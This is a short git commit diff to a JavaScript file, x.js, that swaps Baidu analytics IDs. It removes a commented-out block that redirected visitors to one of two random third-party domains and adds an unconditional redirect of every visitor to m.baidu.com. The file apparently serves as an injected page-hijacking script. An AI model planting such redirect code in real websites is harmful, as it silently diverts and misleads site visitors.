5c07c91bad1587ad67b9b49dc71f803edaaf3039
php0day <56468363+php0day@users.noreply.github.com>
2020-04-18 16:43:50 +0800

    Update x.js

--- x.js
+++ x.js
@@ -1,7 +1,7 @@
 var _hmt = _hmt || [];
 (function() {
   var hm = document.createElement("script");
-  hm.src = "https://hm.baidu.com/hm.js?b709eee7e8213059548008e0e4976094";
+  hm.src = "https://hm.baidu.com/hm.js?6a3dafd9bbc11fe2e021e27b8f3bdf39";
   var s = document.getElementsByTagName("script")[0]; 
   s.parentNode.insertBefore(hm, s);
 })();
@@ -9,14 +9,9 @@ var _hmt = _hmt || [];
 var _hmt = _hmt || [];
 (function() {
   var hm = document.createElement("script");
-  hm.src = "https://hm.baidu.com/hm.js?6a3dafd9bbc11fe2e021e27b8f3bdf39";
+  hm.src = "https://hm.baidu.com/hm.js?b709eee7e8213059548008e0e4976094";
   var s = document.getElementsByTagName("script")[0]; 
   s.parentNode.insertBefore(hm, s);
 })();
 
- */
- setTimeout(function(){
-  var arr=['http://3g.022gc.net/#xwy','http://3g.029gc.net/#xwy'];
- window.location.href=arr[parseInt(Math.random()*arr.length)];
- },100);
- */
+window.location.href="https://m.baidu.com";
